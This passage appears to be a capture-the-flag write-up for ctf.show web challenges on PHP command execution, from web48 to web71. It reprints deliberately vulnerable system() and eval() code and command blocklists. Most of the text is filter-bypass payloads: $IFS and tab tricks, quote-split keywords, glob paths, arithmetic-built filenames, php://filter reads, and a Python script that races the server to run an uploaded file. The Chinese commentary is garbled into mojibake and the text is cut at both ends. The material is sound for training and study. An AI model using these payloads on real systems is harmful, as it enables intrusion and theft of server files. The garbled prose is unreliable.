22:06:20 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤æ›´å¤šäº†\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`\ntac%09fl??.php%0a\ror\rtac%09fl??.php%7c%7c //è®°å¾—è½¬urlç¼–ç  web49 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:22:43 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%\nè™½ç„¶è¿‡æ»¤äº†%ä½†æ˜¯æ˜¯ä¸å½±å“æˆ‘ä»¬ä¼ å…¥çš„urlç¼–ç çš„\ntac%09fl??.php%0a\ror\rtac%09fl??.php%7c%7c web50 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:32:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|`|%|\\x09|\\x26\nåï¼Œæ²¡æ³•ç”¨%09ä»£æ›¿ç©ºæ ¼ï¼Œæ²¡æ³•ç”¨?ä»£æ›¿å­—ç¬¦\nä¸è¿‡å¹¸å¥½è¿˜æœ‰\u0026lt;å’Œ\u0026rsquo;'\ntac\u0026lt;fla%27%27g.php||\ror\rtac\u0026lt;fla%27%27g.php%0a web51 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:42:52 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†\n;|cat|flag| |[0-9]|\\$|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26/\næ€ä¹ˆæŠŠæˆ‘tacä¹Ÿè¿‡æ»¤äº†\næ²¡äº‹èƒ½ç»•è¿‡\nt%27%27ac\u0026lt;fla%27%27g.php||\ror\rt%27%27ac\u0026lt;fla%27%27g.php%0a web51 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-05 22:50:30 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†\n;|cat|flag| |[0-9]|*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;\næˆ‘æµ‹æ€ä¹ˆè¿\u0026lt; \u0026gt;éƒ½è¦è¿‡æ»¤\nåˆ«å¿˜äº†è¿˜å¯ä»¥ç”¨$IFS\nca%27%27t$IFS/fla%27%27g||\ror\rca%27%27t$IFS/fla%27%27g%0a web52 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 18:21:02 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 echo($c); 19 $d = system($c); 20 echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;.$d; 21 }else{ 22 echo \u0026#39;no\u0026#39;; 23 } 24}else{ 25 highlight_file(__FILE__); 26} è¿‡æ»¤äº†\n;|cat|flag| |[0-9]|*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;/\nè¿™é¢˜æ²¡æœ‰åœ¨åé¢è¿›è¡Œå‘½ä»¤æ‹¼æ¥ï¼Œå…¶ä»–å’Œä¸Šä¸€é¢˜ä¸€æ ·\nc%27%27at${IFS}fla%27%27g.php web54 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 19:43:42 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿™é¢˜è¿‡æ»¤äº†å¾ˆå¤šå‘½ä»¤,é¢˜ç›®é€šè¿‡*ä½¿å¾—åªè¦æ˜¯ä¼ å…¥çš„å†…å®¹å‡ºç°å¦‚catä¸‰ä¸ªå­—ç¬¦å³å¯è¢«åŒ¹é…åˆ°ï¼Œæ— æ³•ä½¿ç”¨ä¹‹å‰çš„å­—ç¬¦æ‹¼æ¥æ–¹æ³•ç»•è¿‡\nè¿™é¢˜æ²¡è¿‡ç‡é€šé…ç¬¦?\nè§£ä¸€\n/bin/?at${IFS}f??????? catå‘½ä»¤æ‰€åœ¨çš„è·¯å¾„æ˜¯åœ¨/bin/ç›®å½•ä¸‹ï¼Œæ‰€ä»¥è¿™é‡Œç›¸å½“äºç›´æ¥è°ƒç”¨äº†catæ–‡ä»¶æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œçš„catå¯ä»¥çœ‹ä½œå‘½ä»¤ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥é€šé…ç¬¦å¯ä»¥ç”¨åœ¨è¿™ä¸Šé¢ï¼ˆä¸€å¼€å§‹è¿˜å‚»å‚»çš„æ¢æˆuniqçœ‹èƒ½ä¸èƒ½ç”¨hhhï¼‰ã€‚\nbinä¸‹çš„å‘½ä»¤ï¼šLinux /bin ç›®å½•ä¸‹å‘½ä»¤ç®€è¦è¯´æ˜ - å´”æ—— - åšå®¢å›­\nåŒç†binç›®å½•ä¸‹è¿˜å­˜åœ¨moreï¼Œæ‰€ä»¥è¿™é‡Œçš„catæˆ‘ä»¬æ¢æˆmoreä¹Ÿå¯ä»¥è¯»å–flagã€‚ è§£äºŒ\nvi${IFS}fla?.php or\rc=uniq${IFS}f???.php //å€’åºçš„\ror\rgrep${IFS}%27fla%27${IFS}f???????%0a web55 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 20:03:51 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤äº†\n\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/ è¿™é¢˜æ¶‰åŠåˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹\nä¹Ÿå°±æ˜¯æ— å­—æ¯æ•°å­—çš„å‘½ä»¤æ‰§è¡Œ\nhttps://blog.csdn.net/qq_46091464/article/details/108513145\nhttps://blog.csdn.net/qq_46091464/article/details/108557067\næ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡ | ç¦»åˆ«æ­Œ\næ€è·¯\nshellä¸‹å¯ä»¥åˆ©ç”¨.æ¥æ‰§è¡Œä»»æ„è„šæœ¬ Linuxæ–‡ä»¶åæ”¯æŒç”¨globé€šé…ç¬¦ä»£æ›¿ æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¸€ä¸ªæ–‡ä»¶(æ–‡ä»¶é‡Œé¢çš„shå‘½ä»¤)ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡.(ç‚¹)å»æ‰§è¡Œæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚(å½¢æˆäº†æ¡ä»¶ç«äº‰)ã€‚ä¸€èˆ¬æ¥è¯´è¿™ä¸ªæ–‡ä»¶åœ¨linuxä¸‹é¢ä¿å­˜åœ¨/tmp/php??????ä¸€èˆ¬åé¢çš„6ä¸ªå­—ç¬¦æ˜¯éšæœºç”Ÿæˆçš„æœ‰å¤§å°å†™ã€‚ï¼ˆå¯ä»¥é€šè¿‡linuxçš„åŒ¹é…ç¬¦å»åŒ¹é…ï¼‰\næ³¨æ„ï¼šé€šè¿‡`.`å»æ‰§è¡Œshå‘½ä»¤ä¸éœ€è¦æœ‰æ‰§è¡Œæƒé™ 1.æ„é€ postæ•°æ®åŒ…\n1\u0026lt;!DOCTYPE html\u0026gt; 2\u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; 3\u0026lt;head\u0026gt; 4 \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; 5 \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; 6 \u0026lt;title\u0026gt;POSTæ•°æ®åŒ…POC\u0026lt;/title\u0026gt; 7\u0026lt;/head\u0026gt; 8\u0026lt;body\u0026gt; 9\u0026lt;form action=\u0026#34;http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; 10\u0026lt;!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--\u0026gt; 11 \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;æ–‡ä»¶åï¼š\u0026lt;/label\u0026gt; 12 \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34;\u0026gt;\u0026lt;br\u0026gt; 13 \u0026lt;input type=\u0026#34;submit\u0026#34; name=\u0026#34;submit\u0026#34; value=\u0026#34;æäº¤\u0026#34;\u0026gt; 14\u0026lt;/form\u0026gt; 15\u0026lt;/body\u0026gt; 16\u0026lt;/html\u0026gt; åœ¨ä¸Šä¼ çš„æ–‡ä»¶é‡Œé¢å†™å…¥shæŒ‡ä»¤\n1#!/bin/sh 2ls 2.æŠ“åŒ…\n3.æ„é€ æ‰§è¡Œshå‘½ä»¤çš„poc\nè¯¦ç»†è§£é‡Špocçš„æ„é€ ï¼š\nhttps://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob\næˆ‘ä»¬è¿™é‡Œå¯ä»¥ç†è§£ä¸ºæˆ‘ä»¬è¿™é“é¢˜é‡Œé¢çš„å¹²æ‰°æ–‡ä»¶åéƒ½æ˜¯ç”±å°å†™å­—æ¯ç»„æˆçš„ï¼Œæ‰€æœ‰æ–‡ä»¶åéƒ½æ˜¯å°å†™ï¼Œåªæœ‰PHPç”Ÿæˆçš„ä¸´æ—¶æ–‡ä»¶åŒ…å«å¤§å†™å­—æ¯ï¼Œé‚£æˆ‘ä»¬å°±å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹çš„poc\n?c=.+/???/????????[@-[] æ³¨ï¼šåé¢çš„[@-[]æ˜¯linuxä¸‹é¢çš„åŒ¹é…ç¬¦ï¼Œæ˜¯è¿›è¡ŒåŒ¹é…çš„å¤§å†™å­—æ¯ã€‚ æˆ‘ä»¬å°±æ¥å§\nä¿®æ”¹ä¸€ä¸‹æŒ‡ä»¤å†…å®¹å³å¯å¾—åˆ°flag\nweb56 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\{|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\\u0026gt;|\\\u0026lt;/i\u0026#34;, $c)){ 18 system($c); 19 } 20}else{ 21 highlight_file(__FILE__); 22} ;|[a-z]|[0-9]|\\$|(|{|'|\u0026quot;|`|%|\\x09|\\x26|\u0026gt;|\u0026lt;\nè¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜å¤šè¿‡æ»¤äº†ä¸€ä¸ªæ•°å­—ï¼Œä¸å½±å“æˆ‘ä»¬ä¸Šé¢˜çš„è§£é¢˜æ–¹æ³•\nè¿™é‡Œä¸å†èµ˜è¿°\næ”¾ä¸ªå¤§ä½¬çš„è„šæœ¬\n1import requests 2 3while True: 4\turl = \u0026#34;http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]\u0026#34; 5\tr = requests.post(url, files={\u0026#34;file\u0026#34;: (\u0026#39;feng.txt\u0026#39;, b\u0026#39;cat flag.php\u0026#39;)}) 6\tif r.text.find(\u0026#34;flag\u0026#34;) \u0026gt; 0: 7\tprint(r.text) 8\tbreak web57 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: h1xa 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-08 01:02:56 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11*/ 12 13// è¿˜èƒ½ç‚«çš„åŠ¨å—ï¼Ÿ 14//flag in 36.php 15if(isset($_GET[\u0026#39;c\u0026#39;])){ 16 $c=$_GET[\u0026#39;c\u0026#39;]; 17 if(!preg_match(\u0026#34;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\\u0026#39;|\\\u0026#34;|\\`|\\%|\\x09|\\x26|\\x0a|\\\u0026gt;|\\\u0026lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i\u0026#34;, $c)){ 18 system(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); 19 } 20}else{ 21 highlight_file(__FILE__); 22} è¿‡æ»¤æ¡ä»¶å¢åŠ \n;|[a-z]|[0-9]|`||#|'|\u0026quot;|`|%|\\x09|\\x26|\\x0a|\u0026gt;|\u0026lt;|.|,|?|*|-|=|[/\nè¿™é“é¢˜æŠŠ?è¿‡æ»¤äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥çœ‹åˆ°\nsystem(\u0026#34;cat \u0026#34;.$c.\u0026#34;.php\u0026#34;); è¿™é¢˜ä¼šå°†æˆ‘ä»¬ä¼ å…¥çš„getå‚æ•°è¿›è¡Œæ‹¼æ¥åå†æ‰§è¡Œ\né¢˜ç›®é‡Œæœ‰ä¸ªæš—ç¤º\n//flag in 36.php ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦ç”¨ç¬¦å·æ„é€ å‡º36\næˆ‘ä»¬å¯ä»¥åˆ©ç”¨linuxçš„$(())æ„é€ å‡º36\nåœ¨linuxé‡Œé¢$(())=0ï¼Œ$((~ $(()) ))=-1\nå…¶ä¸­~ç¬¦å·è¡¨ç¤ºå–åï¼Œè¿™é‡Œ0çš„å–åç­‰äºï¼1\nä¹Ÿå°±æ˜¯æˆ‘ä»¬å…ˆå°†36ä¸ª-1åŠ èµ·æ¥å†å–åå¾—åˆ°æˆ‘ä»¬éœ€è¦çš„36\npayload:\nc=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) ä»è€Œå¾—åˆ°flag\nweb58 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} payload:\nc=highlight_file(\u0026#34;flag.php\u0026#34;);\rc=include($_POST[\u0026#39;w\u0026#39;]);\u0026amp;w=php://filter/convert.base64-encode/resource=flag.php //æ–‡ä»¶åŒ…å«ï¼Œå¾—åˆ°çš„å›æ˜¾éœ€è¦è¿›è¡Œbase64è§£ç \rc=show_source(\u0026#39;flag.php\u0026#39;); web59 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} è§£æ³•ä¸ä¸Šé¢˜ä¸€è‡´ï¼Œä¸å†èµ˜è¿°\nï¼ˆæ²¡ææ‡‚ä¸¤é¢˜æœ‰ä»€ä¹ˆåŒºåˆ«ï¼‰\nweb60 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} è§£æ³•ä¾æ—§ä¸web58ä¸€è‡´\nå¯èƒ½æˆ‘å¤ªèœäº†çœ‹ä¸å‡ºæœ‰ä»€ä¹ˆåŒºåˆ«\nweb61 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} ä¾æ—§web58\nweb62 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} ä¾æ—§\u0026hellip;\nweb62 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} ä¾æ—§\u0026hellip;\u0026hellip;\nweb63 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} ä¾æ—§\u0026hellip;\u0026hellip;\nweb64 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} å˜¶ï¼Œæ€ä¹ˆè¿˜æ˜¯é‚£æ ·\u0026hellip;\nweb65 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} åŒä¸Š\u0026hellip;\nweb66 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} æœ¬æ¥ä»¥ä¸ºè¿˜æ˜¯ä¸€æ ·çš„ï¼Œæ²¡æƒ³åˆ°\u0026hellip;\nçœ‹æ¥æˆ‘ä»¬è¦æƒ³åŠæ³•æŸ¥ç›®å½•äº†\næˆ‘ä»¬å¯ä»¥å°è¯•åˆ©ç”¨phpä¸­æŸ¥è¯¢ç›®å½•çš„å‡½æ•°\næ¯”å¦‚ scandir()\nvar_dump(scandir(\u0026#39;/\u0026#39;)); æ¥ä¸‹æ¥å°±æ˜¯æŸ¥flagï¼Œå¯ä»¥é€šè¿‡æ–‡ä»¶åŒ…å«æ¥æŸ¥\nflag.txtå‰é¢è®°å¾—åŠ ä¸Š/\nweb67 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 2020-09-07 22:02:47 9# @email: h1xa@ctfer.com 10# @link: https://ctfer.com 11 12*/ 13 14// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ 15if(isset($_POST[\u0026#39;c\u0026#39;])){ 16 $c= $_POST[\u0026#39;c\u0026#39;]; 17 eval($c); 18}else{ 19 highlight_file(__FILE__); 20} è¿™é¢˜è§£æ³•ä¸web66ä¸€è‡´\nweb68 è¿™é¢˜è²Œä¼¼åªæ˜¯show_sourceå’Œhighlight_fileç”¨ä¸äº†ï¼Œå…¶ä»–æ²¡ä»€ä¹ˆå˜åŒ–\nå¯ä»¥ç›´æ¥ç”¨å‰ä¸¤é¢˜çš„æ–¹æ³•\nä¹Ÿå¯ä»¥ç›´æ¥\nc=include(\u0026#39;/flag.txt\u0026#39;) //èµŒ web69 è¿™é¢˜ç›¸æ¯”ä¸Šä¸€é¢˜ï¼Œprint_r() å’Œ var_dump() ä¹Ÿè¢«ç¦ç”¨äº†\næˆ‘ä»¬å¯ä»¥é€šè¿‡å¯»æ‰¾å…¶ä»–å¯ä»¥æ‰“å°æ•°ç»„çš„å‡½æ•°æ¥æ‰“å°ç›®å½•\næˆ‘ä»¬å¯ä»¥é€šè¿‡var_export()æ¥ä»£æ›¿ï¼Œä»è€Œæ‰“å°ç›®å½•\nc=var_export(scandir(\u0026#34;/\u0026#34;)); æ¥ä¸‹è¯»flagå³å¯\nc=include($_POST[\u0026#39;w\u0026#39;]);\u0026amp;w=php://filter/convert.base64-encode/resource=/flag.txt å…¶ä»–çš„è§£æ³•ï¼š\næŸ¥æ–‡ä»¶\n?c=echo implode(\u0026#34;,\u0026#34;,(scandir(\u0026#39;/\u0026#39;))); ?c=echo json_encode(scandir(\u0026#34;/\u0026#34;)); è¯»æ–‡ä»¶\n?c=readgzfile(\u0026#39;/flag.txt\u0026#39;); web70 è¿™é¢˜æŠŠerror_reporting()å’Œini_set()ç¦ç”¨äº†\nè™½ç„¶ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨ï¼Œä¸å½±å“æˆ‘ç”¨ä¸Šä¸€é¢˜çš„æ–¹æ³•è¯»flag\nweb71 1\u0026lt;?php 2 3/* 4# -*- coding: utf-8 -*- 5# @Author: Lazzaro 6# @Date: 2020-09-05 20:49:30 7# @Last Modified by: h1xa 8# @Last Modified time: 